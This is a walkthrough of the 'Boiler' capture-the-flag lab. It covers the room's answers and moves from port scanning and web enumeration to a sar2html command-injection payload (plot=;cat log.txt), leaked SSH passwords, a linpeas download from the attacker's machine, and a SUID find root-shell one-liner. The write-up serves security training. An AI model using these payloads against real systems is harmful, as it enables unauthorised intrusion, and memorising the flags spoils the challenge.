# Boiler CTF - Medium

```shell
rustscan -a 10.10.81.115 --range 0-65535 --ulimit 5000 -- -sV

ftp 10.10.81.115
#anonymous login

ls -la

get .info.txt

exit
#exit ftp

cat .info.txt
#ciphertext

gobuster dir -u http://10.10.81.115 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
#scanning port 80

cmseek
#gives info about joomla cms

#keep enumerating the web directories
gobuster dir -u http://10.10.81.115/joomla -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

gobuster dir -u http://10.10.81.115/joomla/administrator -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

#check if any exploit exists
searchsploit sar2html
#follow RCE exploit to get SSH creds

ssh basterd@10.10.81.115 -p 55007
#use password from log.txt

ls -la
#includes backup.sh

ssh stoner@10.10.81.115 -p 55007
#use the password found from backup.sh

ls -la

cat .secret
#user flag

find / -perm -u=s -type f 2>/dev/null

sudo -l

cd /tmp

#get linpeas.sh from attacker machine using python server
curl http://10.14.31.212:8000/linpeas.sh --output linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
#find has SUID bit set

#exploit from GTFObins
/usr/bin/find . -exec /bin/sh -p \; -quit

#root shell
cat /root/root.txt
#root flag
```

```markdown
Open ports & services:

  * 21 - ftp - vsftpd 3.0.3
  * 80 - http - Apache httpd 2.4.18 (Ubuntu)
  * 10000 - http - MiniServ 1.930 (Webmin httpd)
  * 55007 - ssh - OpenSSH 7.2p2 (Ubuntu)

FTP supports anonymous login, so we can check for files; there is one named '.info.txt'

Now, this .txt file contains ciphertext, and we can try CyberChef to decipher this by trying various techniques.

Ciphertext:

    Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

Using ROT-13, we can decipher this, and it gives us this plaintext:

    Just wanted to see if you find it. Lol. Remember: Enumeration is the key!

Now, we can check the web servers hosted on port 80 and 10000.

On port 80, we can see a default landing page for Apache webserver.

However, on port 10000, we are getting an error:

    Error - Document follows
    This web server is running in SSL mode. Try the URL <url> instead.

We can leave the port 10000 website for now; we can scan the webpage on port 80 for hidden web directories.

Gobuster scan on port 80:

  * /joomla
  * /manual
  * /robots.txt

The /robots.txt file contains a few disallowed links; we can check each one of them for any clues but they do not yield anything; it also includes a sequence of numbers which seem like decimal.

When the number sequence is converted from decimal to ascii, which when converted from base64 gives a MD5 hash "99b0660cd95adea327c54182baa51584".

The hash can be cracked with online services to give the cleartext "kidding".

Going back to the directories found, /manual contains a lot of links but they are related to documentation.

/joomla is based on the CMS joomla and this can be verified by cmseek tool; the webpage does not have any significant content.

We can use cmseek against the link <http://10.10.81.115/joomla>, and it enumerates the following information:

  * Detected CMS - Joomla
  * Joomla version - 3.9.12-dev
  * Readme file - <http://10.10.81.115/joomla/README.txt>
  * Admin URL (login) - <http://10.10.81.115/joomla/administrator>
  * Open directories - 

    * <http://10.10.81.115/joomla/administrator/templates>
    * <http://10.10.81.115/joomla/administrator/modules>
    * <http://10.10.81.115/joomla/administrator/components>
    * <http://10.10.81.115/joomla/administrator/banners>

Meanwhile we can keep enumerating the webdirectories using Gobuster in order to find something interesting.

One of the directories /joomla/_test is interesting as it contains a webpage for sar2html, and this application seems vulnerable because Searchsploit gives us a RCE exploit; we can try it.

Following the exploit, we need to check <http://10.10.81.115/joomla/_test/index.php?plot=;whoami> and then press 'Select Host' to get command output.

Using the command 'ls -la', we get sar2html related files and a file 'log.txt'.

<http://10.10.81.115/joomla/_test/index.php?plot=;cat log.txt> gives us a SSH log snippet.

This log contains SSH creds basterd:superduperp@$$, so we can use this to connect to SSH.

On SSHing to the machine using the creds found, we get backup.sh, which includes the backup process for another user 'stoner'; it contains the password 'superduperp@$$no1knows'.

Furthermore, the log can be found in /home/stoner/bck.log

So now we can switch to user 'stoner' since we have their password; alternatively, we can open a new SSH session.

User flag can be found in .secret

After this, we just try to find privesc vectors.

linpeas.sh shows that /usr/bin/find has SUID bit set; for find, we have an exploit on GTFObins as well.

After using the exploit, we get shell as root.

Root flag can be found in /root/root.txt
```

1. File extension after anon login - txt

2. What is on the highest port? - ssh

3. What's running on port 10000? - webmin

4. Can you exploit the service running on that port? - nay

5. What CMS can you access? - Joomla

6. The interesting file name in the folder? - log.txt

7. Where was the other users pass stored? - backup

8. user.txt - You made it till here, well done.

9. What did you exploit to get the privileged user?

10. root.txt - It wasn't that hard, was it?
